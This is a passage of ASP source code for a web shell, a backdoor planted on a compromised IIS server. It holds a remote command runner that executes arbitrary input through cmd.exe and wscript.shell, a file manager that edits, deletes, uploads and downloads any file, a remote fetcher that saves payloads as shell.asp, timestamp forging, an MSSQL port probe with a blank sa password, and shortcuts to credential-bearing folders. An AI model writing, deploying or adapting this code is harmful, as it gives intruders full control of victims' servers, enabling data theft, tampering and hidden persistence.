				www output,"<table align=""center"">"
				www output,"<tr><td colspan=""3"" align=""center""><b>ɨ����</b></td></tr>"
				on error resume next
				port=split(port,",")
				for i=0 to ubound(port)
					set conn=Server.CreateObject("ADODB.connection")
					connstr="Provider=SQLOLEDB.1;Data Source="&ip&","&port(i)&";User ID=sa;Password=;"
					'www output,connStr&"<br>"
					conn.ConnectionTimeout=1
					conn.open connstr
					
					If Err Then
						If Err.number=-2147217843 or Err.number=-2147467259 Then
							'www output,err.description&"<br>"
							If InStr(Err.description, "(Connect()).") > 0 Then
								
								www output,"<tr><b><td><font color=""#0000FF"">"&port(i)&"</font></td><td>..........................................</td><td><font color=""#FF0000"">�ر�</font></td></b></tr>"'�ر�
							Else
								www output,"<tr><b><td><font color=""#0000FF"">"&port(i)&"</font></td><td>..........................................</td><td><font color=""#00FF00"">����</font></td></b></tr>" '����
							End If
						End If
					End If
				next
				www output,"</table>"
				if err then
					err.clear
				end if
				if not isEmpty(conn) then
					set conn=nothing
				end if
			end if
		end sub
end class

class fileManager
	private fso,output,isGo
	private sub class_Initialize()
		isGo=1
		output=""
		set fso=server.CreateObject("scripting.filesystemobject")
	end sub
	private sub class_Terminate()
		set fso=nothing
	end sub
	
	public sub main()
		if myRequest("act")<>""  then
			act=myRequest("act")
			fName=myRequest("FName")
			tName=myRequest("TName")
			select case act
				case "createFolder":
					createFolder(fName)
				case "createFile":
					createFile(fName)
				case "deleteFolder":
					deleteFolder(fName)
				case "deleteFile":
					deleteFile(fName)
				case "renameFolder":
					renameFolder fName,tName
				case "renameFile":
					renameFile fName,tName
				case "copyFolder":
					copyFolder fName,tName
				case "copyFile":
					copyFile fName,tName
				case "editFile":
					editFile(fName)
				case "downFile":
					downFile(fName)
				case "setTime":
					setTime(fName)
				case "xmlDown":
					xmlDown()
				case "upFile":
					upFile()
			end select
		end if
		if isGo=1 then
			www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><tr><td><h2 id=""Bin_H2_Title"">File Manager &gt;&gt;</h2>"
			www output,"<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style=""margin:10px 0;""><tr>"
			www output,"<form name=""currentPath""  action="""&myName&""" method=""post"">"
			www output,"<td style=""white-space:nowrap"">��ǰĿ¼ : </td>"
			www output,"<td style=""width:100%""><input name=""myPath"" type=""text"" class=""input"" style=""width:97%;margin:0 8px;height=22px;"" value="""&session("currentPath")&""" /></td>"
			www output,"<input type=""hidden"" name=""action"" value=""fileManager"">"
			www output,"<td style=""white-space:nowrap"" ><input type=""submit"" name=""viewFolder"" value=""Go""  class=""bt"" /></td>"
			
			www output,"</form>"	
			www output,"</tr></table>"
			call getHard()
			call showFile(currentPath)
		end if
		response.write output
		response.Flush()
		output=""
	end sub

	private sub getHard '�õ��̷�
		dim dc
		www output,"<table width=""100%"" border=""0"" cellpadding=""4"" cellspacing=""0"">"
		www output,"<tr class=""alt1""><td colspan=""7"" style=""padding:5px;"">"
		www output,"<a  href=""javascript:var path=window.prompt('�½��ļ���·��','"&format(currentPath)&"\\"&"newFolder');if (path){ inputBox(path,'createFolder');}"">����Ŀ¼</a> | "
		www output,"<a  href=""javascript:var path=window.prompt('�½��ļ�·��','"&format(currentPath)&"\\"&"newfile.asp');if (path){ inputBox(path,'createFile');}"">�����ļ�</a> | "
		www output,"<a  href=""javascript:inputBox('','xmlDown')"">Զ������</a> | "
		www output,"<a  href=""javascript:inputBox('','upFile')"">�ϴ��ļ�</a> | "
		www output,"<br>"
		www output,"<a  href=""javascript:js_showFolder('"&format(wwwPath)&"')"">��վ��Ŀ¼</a> | "
		www output,"<a  href=""javascript:js_showFolder('"&format(myPath)&"')"">������Ŀ¼</a> | "
		set dc=fso.Drives
		For Each d In dc
			if d.DriveType=2 then
				www output,"<a  href=""javascript: js_showFolder('"&format(d.driveletter)&":\\"&"')"">����("&d.driveletter&")</a> | "
			end if
		Next
		For Each d In dc
			if d.DriveType=2 then
				www output,"<a  href=""javascript: js_showFolder('"&format(d.driveletter)&":\\Recycler"&"')"">"&d.driveletter&"\Recycler</a> | "
			end if
		Next
		www output,"<a  href=""javascript:js_showFolder('C:\\WINDOWS\\Temp')"">temp</a> | "
		www output,"<a  href=""javascript:js_showFolder('d:\\iislog')"">IISLog</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Documents and Settings')"">Documents</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\wmpub')"">wmpub</a> | "
		www output,"<a  href=""javascript:js_showFolder('c:\\docume~1\\alluse~1\\Application Data\\Symantec\\pcAnywhere')"">PCAnyWhere</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Program Files\\RhinoSoft.com')"">Su</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\php')"">PHP</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Program Files\\Microsoft SQL Server')"">MSSQL</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Documents and Settings\\All Users\\����')"">����</a> | "
		www output,"<a  href=""javascript:js_showFolder('C:\\Documents and Settings\\All Users\\����ʼ���˵�')"">��ʼ�˵�</a> | "
		
		www output,"</td></tr>"
		www output,"</table>"
	end sub
	
	public sub showFile(path) '�õ��ļ�
	  
		dim colorChoose,pathFolder,folders,files,folderCount
		colorChoose=1
		folderCount=0
		www output,"<table name=""mainTable"">"
		www output,"<tr><td valign=""top""  width=""20%"">"
		www output,"<table style=""width:100%;border-collapse:collapse;"">"
		www output,"<tr class=""head""><td width=""100%""><a href=""javascript:hideObj(document.getElementById('folderList'));""><b>�ļ���</b></a></td></tr>"
		www output,"</table>"
	    on error resume next
		set pathFolder=fso.GetFolder(path)
		
		www output,"<table  id=""folderList"" cellspacing=""0"" border=""0"" style=""width:100%;border-collapse:collapse;"">"
		
		www output,"<tr class=""alt1"">"
		www output,"<td style=""width:2%;""></td><td><a href=""javascript: js_showFolder('"&format(getParentPath(currentPath))&"')"">�����ϼ�Ŀ¼</a></td><td></td><td></td></tr>"
			
		if pathFolder<>"" then
			set folders=pathFolder.subFolders
			for each fd in folders
				'folderCount=folderCount+1
				colorChoose=colorChoose+1
				thisColor=colorChoose mod 2
				if thisColor=0 then
					thisColor=2
				end if
				www output,"<tr class=""alt"&thisColor&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&thisColor&"';"">"
				www output,"<td style=""width:2%;""></td>"
				www output,"<td><a href=""javascript: js_showFolder('"&format(fd.path)&"')"" ><b>"&fd.name&"</b></a></td><td> <a href=""javascript:if (askOK()){ inputBox('"&format(fd.path)&"','deleteFolder');}"">ɾ</a></td> <td><a href=""javascript:var path2=window.prompt('����������ļ���·��','"&format(currentPath)&"\\"&"newFolder');if (path2){ inputBox2('"&format(fd.path)&"','renameFolder',path2);}"">��</a></td>"&""
				www output,"</tr>"
				
			next
			www output,"</table>"
			www output,"</td>"
			www output,"<td valign=""top""  width=""1200"">"
			www output,"<table cellspacing=""0"" border=""1"" style=""width:100%;border-collapse:collapse;"">"
			www output,"<tr class=""head""><td width=""100%""><a href=""javascript:hideObj(document.getElementById('fileList'));""><b>�ļ�</b></a></td></tr>"
			www output,"</table>"
			www output,"<table id=""fileList""  cellspacing=""0"" border=""0"" style=""width:100%;border-collapse:collapse;"">"
			www output,"<tr class=""head"">"
			www output,"<td >&nbsp;</td><td style=""width:25%;"">�ļ���</td><td style=""width:25%;"">����޸�ʱ��</td><td style=""width:15%;"">�ļ���С</td><td style=""width:25%;"">����</td></tr>"
			set files=pathFolder.files
			colorChoose=1
			for each f in files
				colorChoose=colorChoose+1
				thisColor=colorChoose mod 2
				if thisColor=0 then
					thisColor=2
				end if
				goUrl=wwwUrl&mid(f.path,instr(f.path,wwwPath)+len(wwwPath))
				www output,"<tr class=""alt"&thisColor&""" onmouseover=""this.className='focus';"" onmouseout=""this.className='alt"&thisColor&"';"">"
				www output,"<td style=""width:2%;""><input  type=""checkbox"" value="""&format(f.path)&""" name=""fileOption""></td><td><a href="""&goUrl&""" target=""_blank"">"&f.name&"</a></td><td>"&f.DateLastModified&"</td><td>"&f.size&"</td><td><a href=""javascript:inputBox('"&format(f.path)&"','downFile');"">����</a> | <a href=""javascript:var path2=window.prompt('���ƺ���ļ�·��','"&format(currentPath)&"\\"&"newFile.asp');if (path2){ inputBox2('"&format(f.path)&"','copyFile',path2);}"">����</a> | <a href=""javascript:inputBox('"&format(f.path)&"','editFile');"">�༭</a> | <a href=""javascript:var path2=window.prompt('����������ļ�·��','"&format(currentPath)&"\\"&"newFile.asp');if (path2){ inputBox2('"&format(f.path)&"','renameFile',path2);}"">������</a> | <a href=""javascript:inputBox('"&format(f.path)&"','setTime')"">�޸�ʱ��</a></td></tr>"
				
			next
			www output,"<tr class=""alt1""><td><input name=""chkall"" value=""on"" type=""checkbox"" onclick="" allSelect();""></td><td><a href=""javascript:var fNames=getSelectFile();if (fNames!='' & askOK()){inputBox(fNames,'deleteFile');}"">ɾ����ѡ</a></td><td colspan=""4"" style=""text-align:right;"">"&folders.count&" �ļ���/ "&files.count&" �ļ�</td></tr>"
		else
			www output,"</table>"
			www output,"</td>"
			www output,"<td valign=""top""  width=""1200"">"
			www output,"<table cellspacing=""0"" border=""1"" style=""width:100%;border-collapse:collapse;"">"
			www output,"<tr class=""head""><td width=""100%""><a href=""javascript:hideObj(document.getElementById('fileList'));""><b>�ļ�</b></a></td></tr>"
			www output,"</table>"
			www output,"<table id=""fileList""  cellspacing=""0"" border=""0"" style=""width:100%;border-collapse:collapse;"">"
			www output,"<tr class=""head"">"
			www output,"<td >&nbsp;</td><td style=""width:25%;"">�ļ���</td><td style=""width:25%;"">����޸�ʱ��</td><td style=""width:15%;"">�ļ���С</td><td style=""width:25%;"">����</td></tr>"
		end if
		www output,"</table>"
		www output,"</td></tr>"
		www output,"</table>"
		set fso=nothing
	end sub
	
	private sub createFolder(path)
		if not fso.FolderExists(path) and path<>"" then
			fso.CreateFolder(path)
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�����ļ���"&path&"�ɹ�</div><br>"
		end if
	end sub
	
	private sub createFile(path)
		if  path<>"" then
			editFile(path)
		end if
		
	end sub
	
	private sub upFile()
		'on error resume next
		dim upclass,f,savePath
		if myRequest("act2")="save" then
			set upclass=new UPC
			set f=upclass.ua("fileName")
			savePath=upclass.form("savePath")
			if savePath="" or f.fileSize=0 then
				response.write err.description
			else
				f.saveas savePath
				if err=0 then
					www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�����ļ��ɹ�</div><br>"
				end if	
				Set f=nothing
				Set upclass=nothing
			end if
		end if
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><tr><td><h2 id=""Bin_H2_Title"">UpFile >> &gt;&gt;</h2>"
	
		www output,"<form name=""upForm"" method=""post"" action="""&myName&"?action=fileManager&act=upFile&act2=save""  enctype=""multipart/form-data"">"
		www output,"<p>&nbsp;&nbsp;&nbsp;�ϴ��ļ����ƣ�<br>"
		www output,"<input name=""fileName"" type=""file"" style=""margin:0 8px;height=22px;"" class=""input"" size=""100"" value=""http://localhost/shell.txt"" /></p>"
		www output,"<p>&nbsp;&nbsp;&nbsp;�����ļ�·����<br>"
		www output,"<input name=""savePath"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""100"" value="""&currentPath&"\shell.asp"" /></p>"
		www output,"<p><input type=""submit"" name=""upSubmit"" value=""�ύ""  class=""bt"" /> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></p>"	
		
		www output,"</table>"
		isGo=0
	end sub
	
	private sub xmlDown()
		dim fileUrl,savePath,xml,stream
		if myRequest("act2")="save" then
			fileUrl=myRequest("fileUrl")
			savePath=myRequest("savePath")
			Set xml=server.CreateObject("microsoft.xmlhttp")
			xml.open "get",fileUrl,False
			xml.send()
			set stream=server.CreateObject("adodb.stream")
			stream.type=1
			stream.mode=3
			stream.open
			stream.write xml.responseBody
			stream.savetofile(savePath)
			stream.close
			set stream=nothing
			set xml=nothing
			if err=0 then
				www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�����ļ��ɹ�</div><br>"
			end if
		end if
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><tr><td><h2 id=""Bin_H2_Title"">XMLDownLoad >> &gt;&gt;</h2>"
		www output,"<form name=""xmlForm"" method=""post"" action="""&myName&""">"
		www output,"<p>&nbsp;&nbsp;&nbsp;Զ���ļ���ַ��<br>"
		www output,"<input name=""fileUrl"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""100"" value=""http://localhost/shell.txt"" /></p>"
		www output,"<p>&nbsp;&nbsp;&nbsp;�����ļ�·����<br>"
		www output,"<input name=""savePath"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""100"" value="""&currentPath&"\shell.asp"" /></p>"
		www output,"<input type=""hidden"" name=""act"" value=""xmlDown"">"
		www output,"<input type=""hidden"" name=""act2"" value="""">"
		www output,"<input type=""hidden"" name=""action"" value=""fileManager"">"
		www output,"<p><input type=""submit"" name=""xmlSubmit"" value=""�ύ""  class=""bt"" onclick=""document.xmlForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></p>"	
		www output,"</form>"
		www output,"</table>"
		
		isGo=0
	end sub
	
	private sub deleteFolder(path)
		if fso.folderExists(path) and path<>"" then
			fso.deleteFolder(path)
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">ɾ���ļ���"&path&"�ɹ�</div><br>"
		end if
	end sub
	
	private sub deleteFile(path)
		on error resume next
		err.clear
		dim msg1,msg2
		msg1=""
		msg2=""
		path=split(path,"ÿ��") 
		for i=0 to ubound(path)
			if fso.fileExists(path(i)) and path(i)<>"" then
				fso.deletefile(path(i))
				if err.number=0 then
					msg1=msg1&path(i)&"<br>"
				else
					msg2=msg2&path(i)&"<br>"
				end if
			end if
		next
		if msg2<>"" then
			msg2="�޷�ɾ���ļ�"&msg2 
		end if
		if msg1<>"" then
			msg1="�ɹ�ɾ���ļ�"&msg1
		end if
		www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">"&msg1&"<br>"&msg2&"</div><br>"
	end sub
	
	private sub renameFolder(path1,path2)
		if fso.folderExists(path1) and not fso.folderExists(path2) then
			fso.MoveFolder path1,path2
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�ƶ��ļ��гɹ�</div><br>"
		end if
	end sub
	
	private sub renameFile(path1,path2)
		if fso.fileExists(path1) and not fso.fileExists(path2) then
			fso.MoveFile path1,path2
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�ƶ��ļ��ɹ�</div><br>"
		end if
	end sub
	
	private sub copyFolder(path1,path2)
		if fso.folderExists(path1) and not fso.folderExists(path2) then
			fso.copyFolder path1,path2
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�����ļ��гɹ�</div><br>"
		end if
	end sub
	
	private sub copyFile(path1,path2)
		if fso.fileExists(path1) and not fso.fileExists(path2) then
			fso.copyFile path1,path2
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�����ļ��ɹ�</div><br>"
		end if
	end sub
	
	private sub editFile(path)
		if myRequest("act2")="save" then
			set f2=fso.openTextFile(path,2,true)
			f2.writeLine myRequest("fileContent")
			f2.close
			set f2=nothing
			isGo=1
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�����ļ��ɹ�</div><br>"
			exit sub
		end if 
		dim content
		if fso.fileExists(path) then
			set f1=fso.openTextFile(path,1)
			on error resume next
			content=f1.readAll()
			if err then 
				err.clear 
			end if
			f1.close
			set f1=nothing
		end if
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><tr><td><h2 id=""Bin_H2_Title"">Create/ Edit File >> &gt;&gt;</h2>"
		www output,"<form name=""editFileForm"" method=""post"" action="""&myName&""">"
		www output,"<p>&nbsp;&nbsp;&nbsp;��ǰ�ļ���ַ��<br>"
		www output,"<input name=""FName"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""100"" value="""&path&""" /></p>"
		www output,"<p>�ļ����ݣ�<br>"
		www output,"<textarea name=""fileContent""  class=""area"" cols=""100"" rows=""25"">"
		www output,content
		www output,"</textarea></p>"
		www output,"<input type=""hidden"" name=""act"" value=""editFile"">"
		www output,"<input type=""hidden"" name=""act2"" value="""">"
		www output,"<input type=""hidden"" name=""action"" value=""fileManager"">"
		www output,"<p><input type=""submit"" name=""editSubmit"" value=""�ύ""  class=""bt"" onclick=""document.editFileForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></p>"	
		www output,"</form>"
		output=output &"</table>"
		isGo=0
	end sub
	
	private function setTime(path)
		on error resume next
		dim shell,endPot,fileName,filePath,f,s_path,s_file
		path=replace(path,"\\","\")
		endPot=instrrev(path,"\")
		fileName=mid(path,endPot+1)
		filePath=left(path,endPot)
		set f=fso.getFile(path)
		set shell=server.CreateObject("shell.application")
		set s_path=shell.nameSpace(filePath)
		set s_file=s_path.parseName(fileName)
		if myRequest("act2")="save" then
			s_file.modifyDate=myRequest("newTime")
			f.attributes=myRequest("attributes")
			isGo=1
			www output,"<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;"">�޸��ļ����Գɹ�</div><br>"
			exit function
		end if
		
		www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><tr><td>"
		www output,"<h2 id=""Bin_H2_Title"">Set File Attibutes >></h2>"
		www output,"<form name=""setTimeForm"" method=""post"" action="""&myName&""">"
		www output,"<p>·����<br>"
		www output,"<input name=""filePath"" type=""text""  class=""input"" size=""120"" style=""margin:0 8px;height=21px;"" value="""&filePath&""" /></p>"
		www output,"<p>�ļ�����<br>"
		www output,"<input name=""fileName"" type=""text""  class=""input"" size=""120""  style=""margin:0 8px;height=21px;"" value="""&fileName&""" /></p>"
		www output,"<p>����޸�ʱ�䣺<br>"
		www output,"<input name=""newTime"" type=""text""  class=""input"" style=""margin:0 8px;height=21px;"" size=""120"" value="""&f.datelastmodified&""" /></p>"
		www output,"<p>����(�߼�̫���ˣ��Լ����)��<br>"
		www output,"<input name=""attributes"" type=""text""  class=""input""  style=""margin:0 8px;height=21px;"" size=""120"" value="""&f.attributes&""" /><br>"
		www output,"0=��ͨ 1=ֻ�� 2=���� 4=ϵͳ 32=�浵 33=ֻ��,�浵 34=����,�浵 35=ֻ��,����,�浵</p>"
		www output,"<input type=""hidden"" name=""act"" value=""setTime"">"
		www output,"<input type=""hidden"" name=""acttion"" value=""fileManager"">"
		www output,"<input type=""hidden"" name=""fName"" value="""&path&""">"
		www output,"<input type=""hidden"" name=""act2"" value="""">"
		www output,"<p><input type=""submit"" name=""editSubmit"" value=""�ύ""  class=""bt"" onclick=""document.setTimeForm.act2.value='save';""/>  <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></p>"
		www output,"</form>"
		output=output &"</table>"
		isGo=0
		set f=nothing
		set shell=nothing
	end function
	
	private function downFile(path)
 		 Response.Clear
		 On Error Resume Next
		 Set stream=server.CreateObject("adodb.stream")
		 stream.Type = 1
		 stream.Open
		 stream.LoadFromFile Path
		 sz=InstrRev(path,"\")+1
		 Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
	     Response.AddHeader "Content-Length",stream.Size
		 Response.Charset = "UTF-8"
	   	 Response.ContentType = "application/octet-stream"
	  	 Response.BinaryWrite stream.Read
		 Response.Flush
		 stream.Close
	     Set stream = Nothing
		 Response.End
	end function
end class



Class UPC
  Dim D1,D2
  Public Function Form(F)
    F=lcase(F)
    If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function
  Public Function UA(F)
    F=lcase(F)
    If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
    set D1=CreateObject("Scripting.Dictionary")
	if Request.TotalBytes<1 then Exit Sub
    set T1 = CreateObject("adodb.stream")
	T1.Type = 1 : T1.Mode =3 : T1.Open
    T1.Write  Request.BinaryRead(Request.TotalBytes)
    T1.Position=0 : TDa =T1.Read : DStart = 1
    DEnd = LenB(TDa)
    set D2=CreateObject("Scripting.Dictionary")
	vbCrlf = chrB(13) & chrB(10)
    set T2 = CreateObject("adodb.stream")
    TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
    TLen = LenB (TSt)
    DStart=DStart+TLen+1
    while (DStart + 10) < DEnd
      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
      T2.Type = 1 : T2.Mode =3 : T2.Open
      T1.Position = DStart
      T1.CopyTo T2,DIEnd-DStart
      T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
      TIn = T2.ReadText : T2.Close
      DStart = InStrB(DIEnd,TDa,TSt)
      FStart = InStr(22,TIn,"name=""",1)+6
      FEnd = InStr(FStart,TIn,"""",1)
      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
      if InStr (45,TIn,"filename=""",1) > 0 then
        set TFL=new FIF
        FStart = InStr(FEnd,TIn,"filename=""",1)+10
        FEnd = InStr(FStart,TIn,"""",1)
        FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
        FEnd = InStr(FStart,TIn,vbCr)
        TFL.FileStart =DIEnd
        TFL.FileSize = DStart -DIEnd -3
        if not D2.Exists(UpName) then
          D2.add UpName,TFL
        end if
      else
        T2.Type =1 : T2.Mode =3 : T2.Open
        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
        T2.Position = 0 : T2.Type = 2
        T2.Charset ="gb2312"
        SFV = T2.ReadText
        T2.Close
        if D1.Exists(UpName) then
          D1(UpName)=D1(UpName)&", "&SFV
        else
          D1.Add UpName,SFV
        end if
      end if
      DStart=DStart+TLen+1
    wend
    TDa=""
    set T2 =nothing
  End Sub
  Private Sub Class_Terminate
    if Request.TotalBytes>0 then
	  on error resume next
      D1.RemoveAll:D2.RemoveAll
      set D1=nothing:set D2=nothing
      T1.Close:set T1 =nothing
    end if
  End Sub
End Class

Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  Public function SaveAs(F)
	  on error resume next
	  dim T3
	  SaveAs=true
	  if trim(F)="" or FileStart=0 then exit function
	  set T3=CreateObject("adodb.stream")
		 T3.Mode=3 : T3.Type=1 : T3.Open
		 T1.position=FileStart
		 T1.copyto T3,FileSize
		 T3.SaveToFile F,2
		 T3.Close
		 set T3=nothing
		 SaveAs=false
	   end function
End Class


sub doCmd()
	dim output,cmdPath,isWScript,cmd,isWSWord,shell,result
	result=""
	if myRequest("cmdPath")<>"" then
		session("cmdPath")=myRequest("cmdPath")
	end if
	cmdPath=session("cmdPath")
	if cmdPath="" then
		cmdPath="c:\recycler\cmd.exe"
	end if
	isWScript=myRequest("isWscript")
	session("isWScript")=isWScript
	isWScript=session("isWScript")
 	if isWScript="" then
		isWSWord="<input type=""checkBox"" name=""isWscript"" ><b>Wscript</b><br>"
	else
		isWSWord="<input type=""checkBox"" name=""isWscript"" checked><b>Wscript</b><br>"
	end if
	
	if myRequest("act2")="save" then
		cmd=myRequest("cmd")
		if isWScript<>"" then
			set shell=server.CreateObject("wscript.shell")
			set re=shell.exec(cmdPath&" /c "&cmd)
			result=re.stdout.readAll
			set re=nothing
			set shell=nothing
		else
			resultTempFile=server.MapPath("3xFishhead.txt")
			ws.run cmdPath&" /c "&cmd&" >"&resultTempFile,0,true
			set fso=server.CreateObject("scripting.filesystemobject")
			set tf=fso.openTextFile(resultTempFile,1,false)
			result=tf.readAll
			tf.close
			fso.deleteFile(resultTempFile)
			set tf=nothing
			set fso=nothing	
		end if
	end if
	www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><tr><td><h2 id=""Bin_H2_Title"">Cmd &gt;&gt;</h2>"
	www output,"<table width=""100%"" border=""0"" cellpadding=""15"" cellspacing=""0""><td>"
	www output,"<form name=""cmdForm"" method=""post"" action="""&myName&""">"
	www output,"<p>&nbsp;&nbsp;&nbsp;Cmd.exe·����<br>"
	www output,"<input name=""cmdPath"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""100"" value="""&cmdPath&""" />"&isWSWord
	www output,"&nbsp;&nbsp;&nbsp;Cmd���<br>"
	www output,"<input name=""cmd"" type=""text"" style=""margin:0 8px;height=22px;"" class=""input"" size=""100"" value="""&request("cmd")&""" />"
	www output,"<input type=""submit"" name=""cmdSubmit"" value=""�ύ""  class=""bt"" onclick=""document.cmdForm.act2.value='save'""/> <input type=""Button"" name=""back"" value=""����"" class=""bt"" onclick=""history.go(-1);""/></p>"	
	www output,"<p>���Խ����<br>"
	www output,"<textarea name=""result""  class=""area"" cols=""100"" rows=""25"">"
	www output,result
	www output,"</textarea></p>"
	www output,"<input type=""hidden"" name=""act2"" value="""">"
	www output,"<input type=""hidden"" name=""action"" value=""doCmd"">"
	www output,"</form>"
	output=output &"</table>"
	response.write output
end sub

Function getParentPath(currentPath)
		dim tail,endPot
		tail=right(currentPath,1)
		do while (tail="/" or tail="\")
			currentPath=left(currentPath,len(currentPath)-1)
			tail=right(currentPath,1)
		Loop
		
		endPot=instrrev(currentPath,"\")
		tail=mid(currentPath,1,endPot)
		getParentPath=tail
end function
	
function format(currentPath)
		format=replace(currentPath,"\","\\")	
end function 

function getUrlbyPath(path)
	getUrlbyPath=wwwUrl&mid(path,instr(path,wwwPath)+len(wwwPath))
end function

function showerr()
	if err then
  	 response.Write "<br><div  style=""background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:center;font-weight:bold;""><a href=""javascript:history.go(-1)"">"&err.description&"</a></div><br>"
	end if
end function

function showAbout()
	if islogin()=1 and isEnd=true then
		response.write "</table>"
		response.write "<p><br><div style=""padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"">Copyright &copy; 2010 <a href=""#"" >noBlog</a> All Rights Reserved.</div></p>"
	end if
end function

function myRequest(itemName)
	if isShield then
		myRequest=replace(Request(itemName),tempWord,"")
	else
		myRequest=Request(itemName)
	end if
end function
	
sub www(output,s)
	output=output&s&vbcrlf
end sub


%>

</html>

</body></html>
</body></html>